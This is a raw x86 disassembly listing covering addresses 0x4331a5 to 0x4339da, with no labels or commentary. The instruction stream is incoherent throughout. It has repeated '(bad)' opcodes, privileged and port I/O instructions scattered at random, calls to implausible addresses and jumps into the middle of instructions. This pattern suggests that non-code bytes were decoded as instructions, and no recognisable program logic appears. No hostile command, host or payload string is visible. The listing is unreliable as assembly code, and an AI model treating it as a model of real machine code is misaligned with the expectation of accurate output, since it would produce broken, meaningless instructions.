  4331a5:	jne    0x4331a9
  4331a7:	call   0xffa22c6c
  4331ac:	leave  
  4331ad:	rcr    BYTE PTR [esp+eax*4],0x55
  4331b1:	add    ah,ch
  4331b3:	add    BYTE PTR [edi-0x48fef979],dh
  4331b9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4331c0:	inc    esp
  4331c1:	mov    ebx,DWORD PTR [eax]
  4331c3:	fcom   st(2)
  4331c5:	add    BYTE PTR [edi],bl
  4331c7:	lea    ecx,[eax-0x18]
  4331ca:	(bad)  
  4331cb:	push   DWORD PTR [ecx]
  4331cd:	call   0xffb57f2f
  4331d2:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  4331d6:	fstp   DWORD PTR [esi+ebx*8]
  4331d9:	push   ebp
  4331da:	pop    ebp
  4331db:	mov    esi,DWORD PTR [edx-0x38]
  4331de:	add    DWORD PTR [eax],0x28
  4331e1:	mov    edi,DWORD PTR [ebx]
  4331e3:	xor    esi,DWORD PTR [edx+0x3]
  4331e6:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  4331ea:	pop    ebp
  4331eb:	or     al,0x4
  4331ed:	inc    ecx
  4331ee:	push   ebp
  4331ef:	(bad)  
  4331f0:	in     al,dx
  4331f1:	or     ah,ch
  4331f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4331f4:	xbegin 0xffc8a7ea
  4331fa:	clc    
  4331fb:	adc    al,0x45
  4331fd:	idiv   BYTE PTR [ecx]
  4331ff:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  433206:	test   DWORD PTR [ecx+0x665b00f8],ebx
  43320c:	add    BYTE PTR [ecx+0x66],dh
  43320f:	add    eax,DWORD PTR [ebp+0x52]
  433212:	adc    eax,0x20
  433215:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43321b:	test   DWORD PTR [eax],eax
  43321d:	clc    
  43321e:	data16 or al,BYTE PTR [ebp+0x45]
  433222:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  433229:	rol    BYTE PTR [ebp+0x45],1
  43322c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  433232:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  433238:	push   ebx
  433239:	add    BYTE PTR [ecx+0x0],dl
  43323c:	push   ecx
  43323d:	jge    0x433272
  43323f:	add    BYTE PTR [esi+0x4],dl
  433242:	jne    0x4332a9
  433244:	mov    edx,0x457200
  433249:	jmp    0x43320d
  43324b:	xor    edi,DWORD PTR [ebx]
  43324d:	pop    edi
  43324e:	cvtdq2ps xmm7,xmm0
  433251:	ret    0x0
  433254:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43325a:	xor    ecx,DWORD PTR [edi]
  43325c:	add    eax,DWORD PTR [ecx+0x3b]
  43325f:	push   ebx
  433260:	rdpmc  
  433262:	out    0x8d,al
  433264:	add    BYTE PTR [eax],cl
  433266:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43326c:	ret    0x450c
  43326f:	sbb    al,0x8b
  433271:	cmp    eax,esi
  433273:	or     cl,al
  433275:	or     al,0xc2
  433277:	pop    eax
  433278:	inc    ebp
  433279:	add    ecx,DWORD PTR [edi]
  43327b:	add    esi,DWORD PTR [ebp+0x39]
  43327e:	invd   
  433280:	jge    0x43328c
  433282:	mov    eax,0x478ac0
  433287:	cli    
  433288:	xor    esp,ecx
  43328a:	mov    ebx,0x5b8ac0
  43328f:	ret    0x33
  433292:	mov    eax,0x833a8b
  433297:	sub    BYTE PTR [ebx],al
  433299:	inc    ebp
  43329a:	data16 ss clc 
  43329d:	pushf  
  43329e:	inc    bh
  4332a0:	mov    esp,esp
  4332a2:	hlt    
  4332a3:	test   DWORD PTR [ebp-0x8],esi
  4332a6:	mov    eax,DWORD PTR [ebp-0x14]
  4332a9:	cmp    BYTE PTR [ebx-0x76478864],cl
  4332af:	dec    edi
  4332b0:	or     BYTE PTR [eax],al
  4332b2:	jne    0x43323d
  4332b4:	mov    esi,esp
  4332b6:	call   0x77a9be7b
  4332bb:	inc    ebp
  4332bc:	mov    DWORD PTR [eax+0x994f0c],edi
  4332c2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4332c8:	add    BYTE PTR [esi+0x7d],ah
  4332cb:	inc    ebp
  4332cc:	mov    bx,WORD PTR [ebp+0x8]
  4332d0:	add    DWORD PTR [ebp+0x51],0x30c008b
  4332d7:	inc    ebp
  4332d8:	mov    bx,di
  4332db:	lock test BYTE PTR [ecx+0x7000801],bh
  4332e2:	jge    0x4332a5
  4332e4:	mov    ecx,DWORD PTR [ebx-0x660613f0]
  4332ea:	cli    
  4332eb:	xor    bl,bh
  4332ed:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  4332f3:	test   BYTE PTR [eax],cl
  4332f5:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  4332fc:	cmp    ebp,eax
  4332fe:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  433305:	test   BYTE PTR [ebp+0x1],bh
  433308:	mov    ebx,0x458a00
  43330d:	xor    esi,DWORD PTR [ebx]
  43330f:	add    esp,DWORD PTR [esi-0x77]
  433312:	pop    ebp
  433313:	loopne 0x43337b
  433315:	inc    ebp
  433316:	clc    
  433317:	xor    edi,DWORD PTR [ebx]
  433319:	add    esi,DWORD PTR [edx-0x77]
  43331c:	data16 fdivr QWORD PTR [ebp-0x49]
  433320:	mov    ebx,0xb78afc
  433325:	hlt    
  433326:	xor    edi,DWORD PTR [eax]
  433328:	data16 add BYTE PTR [ebp+0x66],bl
  43332c:	data16 lock clc 
  43332f:	cmp    BYTE PTR [ebx],bh
  433331:	add    BYTE PTR [edi+0x66],dh
  433334:	psubq  mm7,QWORD PTR [ebp-0x2]
  433338:	ltr    WORD PTR [ebp+0x66]
  43333c:	add    esi,eax
  43333e:	add    di,WORD PTR [ebp+0x2b]
  433342:	data16 data16 jge 0x4333c3
  433346:	mov    ebx,0xe08a8b
  43334b:	jge    0x433380
  43334d:	data16 data16 xor al,0x5d
  433351:	data16 data16 jne 0x43334d
  433355:	mov    edi,DWORD PTR [ebx]
  433357:	fdiv   QWORD PTR [edx+0x7d]
  43335a:	data16 data16 jge 0x433392
  43335e:	mov    ebx,0x758a66
  433363:	mov    esi,0x667233
  433368:	pop    ebp
  433369:	or     BYTE PTR [esi+0x0],ah
  43336c:	clc    
  43336d:	mov    edi,DWORD PTR [ebx]
  43336f:	lock ja 0x4332fd
  433372:	(bad)  
  433374:	jge    0x43336d
  433376:	invd   
  433378:	pop    ebp
  433379:	add    BYTE PTR [ebx],al
  43337b:	(bad)  
  43337c:	cmp    di,WORD PTR [ebp+0xf]
  433380:	data16 sbb bh,BYTE PTR [ebp+0x0]
  433384:	mov    bx,WORD PTR [ebp-0x10]
  433388:	pop    bp
  43338a:	fbstp  TBYTE PTR [ebx]
  43338c:	test   DWORD PTR [ebx],eax
  43338e:	add    BYTE PTR [ebx],bh
  433390:	add    BYTE PTR [esi+0x7d],ah
  433393:	jge    0x433320
  433395:	data16 in al,dx
  433397:	pop    ebp
  433398:	stc    
  433399:	bsf    ecx,DWORD PTR [ebp+0x66320099]
  4333a0:	mov    edi,ebx
  4333a2:	in     al,dx
  4333a3:	test   BYTE PTR [ebp+0x0],bh
  4333a6:	mov    eax,DWORD PTR [eax]
  4333a8:	call   0xbd402d38
  4333ad:	cmp    BYTE PTR [ecx-0x7699ce00],bl
  4333b3:	sti    
  4333b4:	call   0x8b4bb144
  4333b9:	add    ebp,esp
  4333bb:	mov    bx,di
  4333be:	jnp    0x4333e6
  4333c0:	mov    DWORD PTR [ebx+0x387df808],ecx
  4333c6:	mov    eax,DWORD PTR [eax]
  4333c8:	call   0x7c3ebf33
  4333cd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4333d3:	data16 data16 fistp WORD PTR [ebp+0xe]
  4333d8:	xor    DWORD PTR [edi-0x48fff7af],0xfb66f403
  4333e2:	fisttp WORD PTR [ecx-0x7401f77b]
  4333e8:	(bad)  
  4333e9:	cld    
  4333ea:	jne    0x433424
  4333ec:	xor    eax,DWORD PTR [eax]
  4333ee:	mov    esp,DWORD PTR [esi-0x10]
  4333f1:	sti    
  4333f2:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  4333f9:	data16 adc bl,bh
  4333fc:	push   ebp
  4333fd:	xor    ecx,DWORD PTR es:[ebx+0x38e4f88b]
  433404:	mov    WORD PTR [eax],es
  433406:	cdq    
  433407:	data16 xor bh,bl
  43340a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  433410:	mov    esp,DWORD PTR [esi-0x14]
  433413:	fisttp WORD PTR [ebx-0x3748a9f2]
  433419:	or     al,0x2b
  43341b:	mov    bh,0xba
  43341d:	hlt    
  43341e:	mov    bh,bl
  433420:	add    BYTE PTR [ecx-0x7446f3cd],cl
  433426:	dec    edi
  433427:	or     al,0x0
  433429:	mov    edi,DWORD PTR [ebx]
  43342b:	or     BYTE PTR [ebp+0x3b],dh
  43342e:	mov    ecx,DWORD PTR [edi]
  433430:	fdivr  QWORD PTR [ebx-0x7499ff83]
  433436:	xor    al,0xd8
  433438:	pop    bp
  43343a:	lock xor esi,DWORD PTR [ebx]
  43343d:	lea    esp,[esi+0x1f]
  433440:	icebp  
  433441:	jb     0x433447
  433443:	add    al,al
  433445:	jge    0x433453
  433447:	mov    eax,eax
  433449:	fsubr  st,st(3)
  43344b:	pop    ebp
  43344c:	mov    esi,DWORD PTR [ebx]
  43344e:	in     al,0x8d
  433450:	rcr    DWORD PTR [edi],0xc2
  433453:	jb     0x4334b3
  433455:	add    cl,cl
  433457:	jge    0x433465
  433459:	mov    edx,DWORD PTR [ebp-0x20]
  43345c:	in     al,dx
  43345d:	pop    ebp
  43345e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  433463:	data16 cmp bh,BYTE PTR [ebp+0x0]
  433467:	mov    ebp,DWORD PTR [ebx]
  433469:	fdivr  QWORD PTR [esi+0x668a5d]
  43346f:	cmp    al,0x33
  433471:	mov    si,0x4f7d
  433475:	mov    eax,DWORD PTR [eax]
  433477:	lock inc ebp
  433479:	mov    esi,DWORD PTR [edi]
  43347b:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  433482:	clc    
  433483:	(bad)  
  433484:	cmp    edi,DWORD PTR [ebx]
  433486:	je     0x433497
  433488:	push   ebx
  433489:	loopne 0x43349a
  43348b:	dec    ecx
  43348d:	mov    esp,DWORD PTR [edi-0x1c]
  433490:	int    0xf1
  433492:	mov    esi,0x703084d
  433497:	pcmpgtd mm6,mm1
  43349a:	add    BYTE PTR [ebp+0x66],dh
  43349d:	jmp    0x43346a
  43349f:	mov    eax,DWORD PTR [ebx]
  4334a1:	lock push ebp
  4334a3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4334a9:	or     bh,dl
  4334ab:	jb     0x4334ab
  4334ad:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4334b3:	loopne 0x4334b5
  4334b5:	jne    0x4334b5
  4334b7:	data16 add BYTE PTR [esi+eiz*2],dh
  4334bb:	mov    ecx,ebx
  4334bd:	data16 cmp cl,dh
  4334c0:	add    BYTE PTR [eax],bh
  4334c2:	data16 add bl,cl
  4334c5:	data16 cmp dh,dl
  4334c8:	add    BYTE PTR [edx],bh
  4334ca:	data16 add bl,cl
  4334cd:	enterw 0x4df1,0x19
  4334d2:	pop    edi
  4334d3:	jne    0x433456
  4334d5:	mov    esi,DWORD PTR [edi]
  4334d7:	call   0x77b7c078
  4334dc:	xor    ebp,DWORD PTR [ebx]
  4334de:	lea    esp,[esi+0x48]
  4334e1:	repnz in eax,0x3b
  4334e4:	add    BYTE PTR [ebp-0x37],dh
  4334e7:	xor    edx,DWORD PTR [ebp-0x15]
  4334ea:	in     al,dx
  4334eb:	xor    edx,DWORD PTR [esi+0x40]
  4334ee:	mov    DWORD PTR [edi],0x338545fc
  4334f4:	clc    
  4334f5:	add    esi,DWORD PTR [esi]
  4334f7:	pop    edi
  4334f8:	pushf  
  4334f9:	pop    ebx
  4334fa:	call   0xff4434c1
  4334ff:	mov    edi,eax
  433501:	push   ecx
  433502:	pop    es
  433503:	mov    edi,DWORD PTR [edx]
  433505:	push   esi
  433506:	inc    esp
  433507:	(bad)  
  433508:	jle    0x43350a
  43350a:	popa   
  43350b:	data16 (bad) 
  43350d:	into   
  43350e:	addr16 cmp ch,cl
  433511:	add    BYTE PTR [ecx+0x7ce0866],bh
  433517:	cmp    ah,BYTE PTR [esi+0x0]
  43351a:	add    bh,al
  43351c:	(bad)  
  43351d:	cld    
  43351e:	add    BYTE PTR [ebp+0x36c3f866],al
  433524:	cmp    BYTE PTR [eax+eax*1-0x3c31999a],bl
  43352b:	pop    ebp
  43352c:	or     BYTE PTR [edi+0x0],dl
  43352f:	mov    bh,0x66
  433531:	mov    edi,0xff038dc3
  433536:	jne    0x433589
  433538:	lea    edx,[ecx+0x1]
  43353b:	mov    ebx,0xd64ff1
  433540:	sar    DWORD PTR [ebx],1
  433542:	test   BYTE PTR [ebp+0x32],dh
  433545:	mov    DWORD PTR [esp+edi*8-0x76],esp
  433549:	push   edi
  43354a:	xor    BYTE PTR [ebx],0x3a
  43354d:	mov    esi,ebx
  43354f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  433555:	xor    al,BYTE PTR [ebp+0x64]
  433558:	pop    ebx
  433559:	mov    ebx,0x9c3a37
  43355e:	je     0x43358b
  433560:	xor    edi,DWORD PTR [ebx+0x668a33]
  433566:	mov    WORD PTR [ebx],?
  433568:	xor    bh,BYTE PTR [ebx+0x8b4f64]
  43356e:	pop    edi
  43356f:	cmp    ecx,ecx
  433571:	jne    0x4335c8
  433573:	mov    ebp,esp
  433575:	cld    
  433576:	push   esi
  433577:	pop    ebx
  433578:	inc    ebp
  433579:	stc    
  43357a:	aaa    
  43357b:	test   DWORD PTR [eax+edi*8-0x317af642],ebx
  433582:	clc    
  433583:	test   dl,dl
  433585:	xor    al,0xff
  433587:	fs pop si
  43358a:	or     bl,al
  43358c:	dec    BYTE PTR [ebx+0x57665100]
  433592:	retf   0x3845
  433595:	aaa    
  433596:	add    BYTE PTR [esi+eiz*2+0x3a85cabe],bl
  43359d:	clc    
  43359e:	add    BYTE PTR [ebx+0x66],bl
  4335a1:	dec    edx
  4335a3:	mov    edx,DWORD PTR [edi-0x76]
  4335a6:	push   edi
  4335a7:	add    al,0xb7
  4335a9:	xor    al,0xba
  4335ab:	cmp    al,0x8d
  4335ad:	je     0x4335ae
  4335af:	mov    edx,DWORD PTR [ecx-0x46]
  4335b2:	push   ecx
  4335b3:	lea    edi,[ebx+0x514fff]
  4335b9:	push   ecx
  4335ba:	cmp    edx,DWORD PTR [ebx+0x75]
  4335bd:	mov    ecx,DWORD PTR [ecx+0x723afcbb]
  4335c3:	add    BYTE PTR [ebx],dh
  4335c5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4335cb:	add    BYTE PTR [ebx+esi*1+0x4f64bb32],cl
  4335d2:	mov    ebx,0x3b3a00
  4335d7:	jne    0x433604
  4335d9:	mov    DWORD PTR [ebx+0x728afc],edi
  4335df:	xor    esi,DWORD PTR [ebx]
  4335e1:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  4335e7:	push   edi
  4335e8:	cmp    esp,ebp
  4335ea:	jne    0x4335ec
  4335ec:	sbb    DWORD PTR [eax],0x8085c3fc
  4335f2:	clc    
  4335f3:	inc    esp
  4335f4:	pop    ebx
  4335f5:	sti    
  4335f6:	add    eax,0xeb8bc075
  4335fb:	cld    
  4335fc:	xor    edi,DWORD PTR ds:0xf8c3855e
  433602:	mov    ecx,DWORD PTR [ecx+edx*2]
  433605:	rol    DWORD PTR [ebp-0x37],0xf
  433609:	mov    DWORD PTR [eax],ecx
  43360b:	inc    edi
  43360c:	(bad)  
  43360d:	in     eax,0x2
  43360f:	add    bh,bh
  433611:	(bad)  
  433612:	mov    esi,0xc38a5e
  433617:	mov    esi,DWORD PTR [ebx]
  433619:	push   ecx
  43361a:	mov    edi,0xfc4fc7
  43361f:	test   DWORD PTR [ebp-0x8],edx
  433622:	data16 ss (bad) 
  433625:	pushf  
  433626:	sub    ebp,eax
  433628:	inc    ebp
  433629:	(bad)  
  43362a:	sub    edi,edi
  43362c:	mov    DWORD PTR [ebx+0x3a03ba08],ecx
  433632:	inc    ebp
  433633:	add    BYTE PTR [esi+0x2b],ah
  433636:	or     bh,BYTE PTR [edx+0xf8ac2]
  43363c:	cmp    al,0x33
  43363e:	mov    edi,DWORD PTR [edx+0x24f81]
  433644:	(bad)  
  433645:	cmp    esi,DWORD PTR [ebx]
  433647:	je     0x433601
  433649:	push   ebx
  43364a:	dec    edi
  43364b:	str    ecx
  43364e:	cmp    esp,DWORD PTR [edi+0x75]
  433651:	int    0x33
  433653:	mov    edi,0x789085f
  433658:	mov    ecx,DWORD PTR [eax]
  43365a:	cld    
  43365b:	add    cl,cl
  43365d:	data16 add al,0xcb
  433660:	push   ebp
  433661:	add    ebp,esp
  433663:	jne    0x433651
  433665:	(bad)  
  433666:	mov    DWORD PTR [ecx],0xd685f7ec
  43366c:	clc    
  43366d:	xlat   BYTE PTR ds:[ebx]
  43366e:	inc    ebp
  43366f:	mov    edi,DWORD PTR [ecx]
  433671:	push   eax
  433672:	pushf  
  433673:	in     eax,0x8b
  433675:	add    ah,ch
  433677:	(bad)  
  433678:	push   ecx
  433679:	add    BYTE PTR [ecx+0x66],dl
  43367c:	add    eax,0x3872cb
  433681:	add    BYTE PTR [ebp+0x66],al
  433684:	(bad)  
  433685:	retf   
  433686:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43368d:	retf   
  43368e:	cmp    cl,al
  433690:	pushf  
  433691:	jge    0x43365a
  433693:	aaa    
  433694:	cld    
  433695:	pushf  
  433696:	test   DWORD PTR [edi-0x8],ebx
  433699:	je     0x4336e0
  43369b:	xor    esi,DWORD PTR ds:0x7020840
  4336a1:	ror    BYTE PTR [ebp-0x37],0x8d
  4336a5:	push   ebp
  4336a6:	add    esp,ebp
  4336a8:	jb     0x433635
  4336aa:	add    BYTE PTR [eax],cl
  4336ac:	dec    ebp
  4336ad:	mov    bh,0x81
  4336af:	push   esi
  4336b0:	push   ecx
  4336b1:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  4336b8:	xor    al,BYTE PTR [eax]
  4336ba:	mov    edx,DWORD PTR [edi+0x10]
  4336bd:	(bad)  
  4336be:	scas   eax,DWORD PTR es:[edi]
  4336bf:	cmp    bh,BYTE PTR [ebx]
  4336c1:	add    BYTE PTR [edi],cl
  4336c3:	mov    ebp,ebp
  4336c5:	cld    
  4336c6:	add    BYTE PTR [ebx],bh
  4336c8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4336cc:	dec    ebp
  4336cd:	or     BYTE PTR [ebx],ch
  4336cf:	ret    0x458b
  4336d2:	lock jmp 0x4336c6
  4336d5:	mov    ecx,DWORD PTR [eax]
  4336d7:	or     BYTE PTR [edi],al
  4336d9:	mov    ecx,eax
  4336db:	xor    DWORD PTR [edx+0x2],0x0
  4336df:	mov    bh,0xc1
  4336e1:	adc    BYTE PTR [eax],dh
  4336e3:	iret   
  4336e4:	inc    ebp
  4336e5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4336eb:	inc    BYTE PTR [ebx]
  4336ed:	cmp    bh,al
  4336ef:	add    BYTE PTR [ecx],dl
  4336f1:	data16 adc al,bh
  4336f4:	dec    ecx
  4336f5:	fisttp WORD PTR [ecx+0x456604c0]
  4336fb:	add    dh,BYTE PTR ds:0x75e0845
  433701:	ret    0x4d
  433704:	lea    ecx,[ebx+0x18728301]
  43370a:	add    BYTE PTR [ebp+0x45],al
  43370d:	ss jmp 0x10a37af
  433713:	call   0xf8cebc5d
  433718:	clc    
  433719:	inc    ebp
  43371a:	shl    DWORD PTR ds:0x781084d,0x51
  433721:	cdq    
  433722:	push   ecx
  433723:	xor    al,BYTE PTR [ecx+0x32f89989]
  433729:	inc    ebp
  43372a:	cmp    edi,DWORD PTR [esi]
  43372c:	jbe    0x4336ca
  43372e:	mov    eax,edi
  433730:	or     ah,dh
  433732:	inc    ebp
  433733:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  433739:	cmp    BYTE PTR [ebx-0x74747664],cl
  43373f:	in     al,dx
  433740:	hlt    
  433741:	push   ecx
  433742:	push   ecx
  433743:	push   ecx
  433744:	push   ecx
  433745:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43374b:	cdq    
  43374c:	cdq    
  43374d:	xor    dh,BYTE PTR [edx]
  43374f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  433755:	or     BYTE PTR [ebp+0x7],al
  433758:	mov    eax,ecx
  43375a:	clc    
  43375b:	jb     0x43371e
  43375d:	add    BYTE PTR [ebp+0x55],cl
  433760:	or     DWORD PTR [edi],0xc251d151
  433766:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  433770:	mov    edi,eax
  433772:	or     cl,al
  433774:	inc    ebp
  433775:	dec    ebp
  433776:	mov    eax,DWORD PTR [ecx+0x514d510c]
  43377c:	or     WORD PTR [ecx],0x8999
  433781:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433787:	mov    edx,DWORD PTR [ecx+0x8]
  43378a:	mov    eax,DWORD PTR [ebp-0x8]
  43378d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433794:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43379a:	inc    ebp
  43379b:	dec    eax
  43379c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  4337a2:	add    edx,DWORD PTR [ecx-0x8]
  4337a5:	mov    ecx,DWORD PTR [ecx]
  4337a7:	clc    
  4337a8:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  4337af:	mov    ecx,ebp
  4337b1:	clc    
  4337b2:	(bad)  
  4337b3:	popf   
  4337b4:	inc    DWORD PTR [eax]
  4337b6:	ret    0x8b
  4337b9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4337bf:	mov    edi,esp
  4337c1:	hlt    
  4337c2:	test   ecx,esi
  4337c4:	clc    
  4337c5:	or     BYTE PTR [ebp+0x7],al
  4337c8:	cmp    ecx,eax
  4337ca:	pushf  
  4337cb:	jb     0x433800
  4337cd:	add    BYTE PTR [eax-0x3f],al
  4337d0:	inc    eax
  4337d1:	daa    
  4337d2:	inc    ebp
  4337d3:	inc    ebp
  4337d4:	xor    eax,0x7f80803
  4337d9:	dec    ebp
  4337da:	cdq    
  4337db:	add    esi,DWORD PTR [edx]
  4337dd:	clc    
  4337de:	cmp    DWORD PTR [ecx],ecx
  4337e0:	or     al,0x8
  4337e2:	add    al,BYTE PTR [ebp+0x2c]
  4337e5:	xor    eax,0x7350845
  4337ea:	or     BYTE PTR [ebp+0x7],cl
  4337ed:	lea    ebx,[ecx-0x748dcdff]
  4337f3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4337fa:	mov    edx,DWORD PTR [eax]
  4337fc:	cld    
  4337fd:	dec    ebp
  4337fe:	push   ecx
  4337ff:	sub    edx,DWORD PTR [ecx-0x75]
  433802:	add    eax,0xf172fc
  433807:	or     BYTE PTR [ebp+0x7],cl
  43380a:	add    eax,ecx
  43380c:	or     al,0x72
  43380e:	add    DWORD PTR [eax],eax
  433810:	mov    ebx,0x29c2c1
  433815:	inc    ebp
  433816:	mov    eax,DWORD PTR [ebx]
  433818:	cmp    eax,0x3004d1c
  43381e:	xbegin 0x66c8c418
  433824:	clc    
  433825:	or     BYTE PTR [ebp+0x45],al
  433828:	cmp    DWORD PTR ds:0x78b089c,esi
  43382e:	adc    BYTE PTR [ebp+0x45],cl
  433831:	lea    eax,[ebp+0x33727501]
  433837:	add    cl,ch
  433839:	inc    ebp
  43383a:	add    bl,ch
  43383c:	add    BYTE PTR [ebx+0x45850845],cl
  433842:	je     0x4337cf
  433844:	push   ebx
  433845:	or     al,0x85
  433847:	dec    ebp
  433848:	std    
  433849:	mov    bh,bh
  43384b:	mov    BYTE PTR [ebp-0x75],al
  43384e:	mov    edi,eax
  433850:	or     al,0x89
  433852:	inc    ebp
  433853:	clc    
  433854:	mov    esp,esp
  433856:	hlt    
  433857:	call   DWORD PTR [edi-0x37]
  43385a:	push   ecx
  43385b:	or     al,0x51
  43385d:	push   ebp
  43385e:	xor    ebp,esp
  433860:	mov    esi,0x457251
  433865:	ss (bad) 
  433867:	pushf  
  433868:	inc    ebp
  433869:	(bad)  
  43386a:	mov    edi,eax
  43386c:	or     al,0x85
  43386e:	add    al,bh
  433870:	inc    eax
  433872:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  433876:	or     ah,bh
  433878:	inc    eax
  433879:	push   ecx
  43387a:	jmp    0x4338cd
  43387c:	mov    eax,DWORD PTR ds:0xe8720c
  433882:	mov    DWORD PTR [ebp-0x8],eax
  433885:	jne    0x4338cc
  433887:	jmp    0x433814
  433889:	mov    ebp,DWORD PTR [eax]
  43388b:	clc    
  43388c:	retf   0xff51
  43388f:	push   ecx
  433890:	mov    DWORD PTR ds:0x757210,eax
  433896:	mov    ecx,DWORD PTR [ebp-0x4]
  433899:	sub    esp,DWORD PTR [ebx-0x77]
  43389c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4338a3:	or     ah,bh
  4338a5:	pop    es
  4338a6:	ds cdq 
  4338a8:	push   DWORD PTR [edx]
  4338aa:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4338b0:	(bad)  
  4338b1:	mov    bh,bh
  4338b3:	jmp    0x4338a1
  4338b5:	leave  
  4338b6:	jne    0x4338c0
  4338b8:	call   0x303212
  4338bd:	in     al,dx
  4338be:	dec    ebp
  4338bf:	add    dh,BYTE PTR [ebx]
  4338c1:	add    BYTE PTR [ebx],al
  4338c3:	inc    ebp
  4338c4:	cmp    esi,DWORD PTR [esi]
  4338c6:	je     0x433864
  4338c8:	mov    eax,edi
  4338ca:	or     al,0xf0
  4338cc:	add    BYTE PTR [ebp+0x458bf845],al
  4338d2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4338d8:	adc    al,0x7
  4338da:	enter  0x9fc0,0xa5
  4338de:	rol    BYTE PTR [eax],0x5e
  4338e1:	mov    ecx,ecx
  4338e3:	or     al,0xc
  4338e5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4338ec:	jmp    0x4338ed
  4338ee:	push   ebp
  4338ef:	mov    esp,ebp
  4338f1:	cld    
  4338f2:	inc    ebp
  4338f3:	inc    ebp
  4338f4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4338fb:	push   esi
  4338fc:	push   esi
  4338fd:	mov    edi,0x7af080f
  433902:	add    bh,al
  433904:	test   DWORD PTR [ecx+0x3a7320f],ebx
  43390a:	add    BYTE PTR [ecx+0x4540100f],cl
  433910:	mov    ebp,eax
  433912:	mov    ebp,edi
  433914:	lock call edx
  433917:	fcom   DWORD PTR [ebp+0x45]
  43391a:	mov    eax,0x148a8b
  43391f:	push   ecx
  433920:	enter  0xc145,0x83
  433924:	cmp    cl,BYTE PTR [eax]
  433926:	add    BYTE PTR [ebp+0x4d],al
  433929:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  43392f:	call   0xffa3349e
  433934:	cmp    eax,DWORD PTR [ebp-0xc]
  433937:	jmp    DWORD PTR [eax+edx*1-0x4e]
  43393b:	push   ebp
  43393c:	(bad)
  43393f:	std    
  433940:	lock push DWORD PTR [edi+0x5d08fcdb]
  433947:	inc    ebp
  433948:	(bad)  
  433949:	call   0xff7d35d9
  43394e:	add    al,BYTE PTR [ebp+0x37]
  433951:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433957:	jne    0x433959
  433959:	(bad)  
  43395a:	cmp    edi,esp
  43395c:	jne    0x43398f
  43395e:	mov    edi,edi
  433960:	or     BYTE PTR [ebx-0x307f0b49],cl
  433966:	pop    ds
  433967:	into   
  433968:	je     0x43392b
  43396a:	mov    ebx,DWORD PTR [esi]
  43396c:	or     BYTE PTR [ebp-0x49],al
  43396f:	mov    esp,DWORD PTR [esi-0x77]
  433972:	mov    esi,0xfe451f0c
  433977:	mov    eax,DWORD PTR [eax]
  433979:	or     al,0x66
  43397b:	sar    bl,0x3b
  43397e:	xor    esi,DWORD PTR [ebp+0x66]
  433981:	xor    ecx,edi
  433983:	pop    edi
  433984:	adc    bl,BYTE PTR [ebx+0x7e]
  433987:	ret    0xff
  43398a:	cld    
  43398b:	inc    ebp
  43398c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433992:	cld    
  433993:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  43399a:	push   0xffffff83
  43399c:	pop    edi
  43399d:	or     BYTE PTR [ebp+0x53],dh
  4339a0:	xorps  xmm1,xmm2
  4339a3:	test   BYTE PTR [eax+eax*1],bh
  4339a6:	add    BYTE PTR [eax],al
  4339a8:	adc    eax,eax
  4339aa:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4339b2:	jmp    DWORD PTR [eax]
  4339b4:	ror    al,0x5e
  4339b7:	inc    ebp
  4339b8:	leave  
  4339b9:	xor    ecx,DWORD PTR [eax]
  4339bb:	and    DWORD PTR [ebx-0x3ec70708],ecx
  4339c1:	add    ch,al
  4339c3:	xor    edi,edi
  4339c5:	xor    DWORD PTR [ebx],0x660033fe
  4339cb:	mov    DWORD PTR [ebp-0xc],ecx
  4339ce:	pcmpgtw mm0,mm0
  4339d1:	add    dl,ah
  4339d3:	leave  
  4339d4:	mov    edi,DWORD PTR [eax-0x7d]
  4339d7:	push   ax
  4339d9:	dec    ebp
  4339da:	mov    esi,DWORD PTR [ebx-0x75]
